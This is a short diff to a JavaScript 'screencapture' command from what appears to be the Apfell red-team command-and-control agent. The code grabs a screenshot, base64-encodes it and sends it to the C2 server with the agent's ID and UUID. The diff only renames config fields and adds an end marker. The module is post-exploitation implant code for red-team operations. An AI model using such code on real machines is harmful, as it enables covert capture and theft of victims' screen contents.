@@ -6,7 +6,7 @@ screencapture = function(params){
             C2.sendError(taskid, tasktype);
         } else {
             let encImg = img.toString().split(',')[1];
-            const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, encImg.length, taskid, tasktype, encImg);
+            const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, encImg.length, taskid, tasktype, encImg);
             let meta = {};
             meta["metatype"] = 3;
             meta["metadata"] = apfellmsg;
@@ -18,4 +18,4 @@ screencapture = function(params){
 };
 
 C2.commands[screencapture.name] = screencapture;
-
+COMMAND_ENDS_HERE
